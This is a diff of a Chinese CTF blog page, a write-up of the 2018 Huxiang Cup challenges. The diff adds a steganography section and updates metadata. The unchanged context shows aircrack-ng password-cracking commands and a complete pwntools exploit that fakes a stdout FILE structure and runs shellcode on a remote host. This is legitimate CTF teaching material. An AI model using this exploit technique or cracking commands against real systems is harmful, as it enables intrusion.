@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="pwn,ctf,re,crypto," />
+  <meta name="keywords" content="ctf,pwn,re,crypto," />
 
 
 
@@ -84,7 +84,7 @@
 
 
 <meta name="description" content="随便做了选择题，进了复赛，然后打了一下，挺多原题的….，就感觉pwn300还行，不过还是发现了自己的不足，自己以后还是需要加强逆向和pwn这块…..  题目链接 签到single welcome WEBCode Check/news 下有源码，写个加密脚本然后sql注入就行了，最后在notice2表里面找到flag    Readflagssrf，然后偶然发现目录下直接有个flag文件   MyN">
-<meta name="keywords" content="pwn,ctf,re,crypto">
+<meta name="keywords" content="ctf,pwn,re,crypto">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[2018湖湘杯] writesup">
 <meta property="og:url" content="http://yoursite.com/2018/11/18/2018湖湘杯-writesup/index.html">
@@ -101,7 +101,8 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-62964bc036b67ef1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-feec36a9056ef349.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-e02f79808cd55361.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-11-18T16:14:53.170Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-fe66a1bd696483dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-19T02:04:54.561Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[2018湖湘杯] writesup">
 <meta name="twitter:description" content="随便做了选择题，进了复赛，然后打了一下，挺多原题的….，就感觉pwn300还行，不过还是发现了自己的不足，自己以后还是需要加强逆向和pwn这块…..  题目链接 签到single welcome WEBCode Check/news 下有源码，写个加密脚本然后sql注入就行了，最后在notice2表里面找到flag    Readflagssrf，然后偶然发现目录下直接有个flag文件   MyN">
@@ -385,7 +386,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1k
+                  1.1k
                 </span>
               
 
@@ -442,6 +443,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#爆破密码</span><br><span class="line">aircrack-ng -w pass.txt ctf.pcap</span><br><span class="line"></span><br><span class="line">#解密流量包</span><br><span class="line">airdecap-ng ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure>
 <p><img src="https://upload-images.jianshu.io/upload_images/5808046-feec36a9056ef349.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/5808046-e02f79808cd55361.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><p>png图片里面有3个IEND块，所以有3张图，分离出来之后第二张lsb隐写，第1，3张盲水印，然后还有png文件最后一段，3段组成flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-fe66a1bd696483dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Regex-Format"><a href="#Regex-Format" class="headerlink" title="Regex Format"></a>Regex Format</h2><p> 跟网鼎杯的<a href="https://www.jianshu.com/p/f14adeda85df" target="_blank" rel="noopener">blind</a>一样做法，改简单了，直接覆盖stdout的地址伪造IO_FILE结构体，然后伪造vtable，可以获得任意地址执行，直接写shellcode到bss段，然后执行到shellcode就行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &quot;./pwn1&quot;</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#p = process(&quot;./pwn1&quot;)</span><br><span class="line">p = remote(&apos;47.106.243.235&apos;,8888)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;format\n&apos;)</span><br><span class="line">p.sendline(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">fake_IO_stdout_addr = 0x0804A24C</span><br><span class="line">fake_vtable = 0x0804A24C + 0x100 </span><br><span class="line"></span><br><span class="line">fake_IO_stdout = p32(0xfbad8000) + p32(0x0804A44C)*8 + p32(0)*4</span><br><span class="line">fake_IO_stdout += p32(0x0804A44C) + p32(1) + p32(0) + p32(0xffffffff)</span><br><span class="line">fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0xffffffff)*2</span><br><span class="line">fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0)*3</span><br><span class="line">fake_IO_stdout += p32(0xffffffff) + p32(0)*10 + p32(fake_vtable)</span><br><span class="line">fake_IO_stdout += p32(0x0804A44C) + p32(0x0804A44C)</span><br><span class="line"></span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(0x100,&apos;\x00&apos;)</span><br><span class="line"></span><br><span class="line">payload = fake_IO_stdout + &apos;a&apos;*28 + p32(0x0804A24C + 0x120) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;match\n&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;?[Y/n]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;format\n&apos;)</span><br><span class="line">p.sendline(&apos;a&apos;*0x49 + p32(fake_IO_stdout_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="hunger"><a href="#hunger" class="headerlink" title="hunger"></a>hunger</h2><p>原题，不多说…</p>
@@ -481,9 +484,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
-          
             <a href="/tags/ctf/" <i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
           
             <a href="/tags/re/" <i class="fa fa-tag"></i> re</a>
           
@@ -669,7 +672,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#single-welcome"><span class="nav-number">1.1.</span> <span class="nav-text">single welcome</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-Check"><span class="nav-number">2.1.</span> <span class="nav-text">Code Check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Readflag"><span class="nav-number">2.2.</span> <span class="nav-text">Readflag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MyNote"><span class="nav-number">2.3.</span> <span class="nav-text">MyNote</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Replace"><span class="nav-number">3.1.</span> <span class="nav-text">Replace</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Disk"><span class="nav-number">4.1.</span> <span class="nav-text">Disk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flow"><span class="nav-number">4.2.</span> <span class="nav-text">Flow</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Regex-Format"><span class="nav-number">5.1.</span> <span class="nav-text">Regex Format</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hunger"><span class="nav-number">5.2.</span> <span class="nav-text">hunger</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#签到"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#single-welcome"><span class="nav-number">1.1.</span> <span class="nav-text">single welcome</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-Check"><span class="nav-number">2.1.</span> <span class="nav-text">Code Check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Readflag"><span class="nav-number">2.2.</span> <span class="nav-text">Readflag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MyNote"><span class="nav-number">2.3.</span> <span class="nav-text">MyNote</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Replace"><span class="nav-number">3.1.</span> <span class="nav-text">Replace</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Disk"><span class="nav-number">4.1.</span> <span class="nav-text">Disk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flow"><span class="nav-number">4.2.</span> <span class="nav-text">Flow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-Write"><span class="nav-number">4.3.</span> <span class="nav-text">Hidden Write</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Regex-Format"><span class="nav-number">5.1.</span> <span class="nav-text">Regex Format</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hunger"><span class="nav-number">5.2.</span> <span class="nav-text">hunger</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -727,7 +730,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共38.7k字</span>
+  <span class="post-count">博客全站共38.8k字</span>
 </div>
 
         
